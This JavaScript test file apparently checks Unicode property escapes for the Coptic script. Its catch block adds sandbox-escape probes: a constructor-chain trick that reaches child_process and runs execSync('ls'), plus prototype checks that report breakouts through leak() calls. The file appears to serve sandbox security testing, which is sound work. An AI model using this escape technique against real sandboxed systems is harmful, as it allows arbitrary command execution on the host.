try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                994,
                1007
            ],
            [
                11392,
                11507
            ],
            [
                11513,
                11519
            ],
            [
                66272,
                66299
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Coptic}+$/u, matchSymbols, '\\p{Script_Extensions=Coptic}');
    testPropertyEscapes(/^\p{Script_Extensions=Copt}+$/u, matchSymbols, '\\p{Script_Extensions=Copt}');
    testPropertyEscapes(/^\p{Script_Extensions=Qaac}+$/u, matchSymbols, '\\p{Script_Extensions=Qaac}');
    testPropertyEscapes(/^\p{scx=Coptic}+$/u, matchSymbols, '\\p{scx=Coptic}');
    testPropertyEscapes(/^\p{scx=Copt}+$/u, matchSymbols, '\\p{scx=Copt}');
    testPropertyEscapes(/^\p{scx=Qaac}+$/u, matchSymbols, '\\p{scx=Qaac}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                993
            ],
            [
                1008,
                11391
            ],
            [
                11508,
                11512
            ],
            [
                11520,
                56319
            ],
            [
                57344,
                66271
            ],
            [
                66300,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Coptic}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Coptic}');
    testPropertyEscapes(/^\P{Script_Extensions=Copt}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Copt}');
    testPropertyEscapes(/^\P{Script_Extensions=Qaac}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Qaac}');
    testPropertyEscapes(/^\P{scx=Coptic}+$/u, nonMatchSymbols, '\\P{scx=Coptic}');
    testPropertyEscapes(/^\P{scx=Copt}+$/u, nonMatchSymbols, '\\P{scx=Copt}');
    testPropertyEscapes(/^\P{scx=Qaac}+$/u, nonMatchSymbols, '\\P{scx=Qaac}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}